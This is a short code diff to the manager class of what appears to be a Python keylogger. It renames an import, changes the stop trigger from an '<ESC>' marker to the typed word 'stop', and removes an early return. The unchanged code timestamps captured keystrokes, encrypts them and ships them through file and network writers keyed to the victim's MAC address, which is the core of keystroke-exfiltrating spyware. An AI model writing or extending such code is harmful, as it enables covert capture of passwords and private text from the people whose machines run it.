@@ -1,5 +1,5 @@
 from encryption.encryption import Encryption
-from keylogger.new_keylogger import KeyloggerService
+from keylogger.keylogger_service import KeyloggerService
 from writer.FileWriter import FileWriter
 from writer.NetWorkWriter import NetWorkWriter
 from time import sleep
@@ -29,14 +29,12 @@ class KeyLoggerManager:
             if logged_keys:
                 logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                 try:
-                    if "<ESC>" in logged_keys:
+                    if "stop" in logged_keys:
                         self.keylogger.stop_logging()
                         self.flag = False
-                        return
                     encrypted_data = self.encoder.encryption(logged_keys)
                     self.file_writer.send_data(encrypted_data, self.mac_address)
                     self.netWork_writer.send_data(encrypted_data, self.mac_address)
-
                 except Exception as e:
                     print(e)
                     return
